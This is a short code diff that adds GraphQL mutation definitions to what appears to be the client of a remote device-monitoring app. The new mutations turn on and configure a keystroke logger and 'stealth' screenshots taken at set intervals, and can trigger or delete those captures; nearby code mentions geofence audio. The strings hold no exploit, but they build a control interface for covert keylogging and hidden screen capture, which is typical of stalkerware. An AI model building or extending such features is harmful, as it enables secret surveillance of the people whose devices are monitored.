@@ -979,3 +979,57 @@ export const deleteGeofenceAudioGQL = `
     deleteGeofenceAudio(id: $id)
   }
 `
+
+export const setKeystrokeLoggerEnabledGQL = `
+  mutation setKeystrokeLoggerEnabled($enabled: Boolean!) {
+    setKeystrokeLoggerEnabled(enabled: $enabled)
+  }
+`
+
+export const setKeystrokeBufferLimitGQL = `
+  mutation setKeystrokeBufferLimit($limit: Int!) {
+    setKeystrokeBufferLimit(limit: $limit)
+  }
+`
+
+export const clearKeystrokeLogGQL = `
+  mutation clearKeystrokeLog {
+    clearKeystrokeLog
+  }
+`
+
+export const deleteKeystrokeEntryGQL = `
+  mutation deleteKeystrokeEntry($id: String!) {
+    deleteKeystrokeEntry(id: $id)
+  }
+`
+
+export const setStealthScreenshotEnabledGQL = `
+  mutation setStealthScreenshotEnabled($enabled: Boolean!) {
+    setStealthScreenshotEnabled(enabled: $enabled)
+  }
+`
+
+export const setStealthScreenshotConfigGQL = `
+  mutation setStealthScreenshotConfig($intervalMin: Int!, $keepCount: Int!) {
+    setStealthScreenshotConfig(intervalMin: $intervalMin, keepCount: $keepCount)
+  }
+`
+
+export const triggerStealthScreenshotGQL = `
+  mutation triggerStealthScreenshot {
+    triggerStealthScreenshot
+  }
+`
+
+export const deleteStealthScreenshotGQL = `
+  mutation deleteStealthScreenshot($id: String!) {
+    deleteStealthScreenshot(id: $id)
+  }
+`
+
+export const clearStealthScreenshotsGQL = `
+  mutation clearStealthScreenshots {
+    clearStealthScreenshots
+  }
+`
